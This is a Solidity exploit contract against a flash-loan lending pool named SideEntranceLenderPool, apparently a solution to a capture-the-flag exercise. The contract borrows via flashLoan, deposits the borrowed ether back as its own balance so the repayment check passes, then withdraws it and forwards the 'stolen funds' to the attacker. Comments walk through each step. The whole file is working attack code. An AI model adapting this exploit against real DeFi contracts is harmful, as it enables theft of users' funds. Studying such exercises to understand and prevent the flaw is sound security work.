// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

contract Exploiter {

    SideEntranceLenderPool pool;
    address attacker;

    constructor(address _pool)
    {
        pool = SideEntranceLenderPool(_pool);
        attacker = msg.sender;
    }


    // we call this function to start the attack
    function attackContract(uint256 amount) public {

        pool.flashLoan(amount); // we take amount out of the pool as a loan, in the flash loan function the execute function from the interface is called.
        // we implement that execute function in this attack contract and in that function we deposit the money into the pool as ours.abi
        // the flashloan check ==> if (address(this).balance < balanceBefore) will pass because the balance of the contract is as before because we deposited not return the loan back.

        pool.withdraw(); // we then call the withdraw function which will send funds to our receive function in this contract

        
    }

    function execute() external payable { // this is the implementation of the interface function
        pool.deposit{value: address(this).balance}(); // depositing our taken loan but as balance, not as repaying the loan back.
    }

    receive() external payable {
        payable(attacker).send(address(this).balance);
    } // receiving stolen funds
}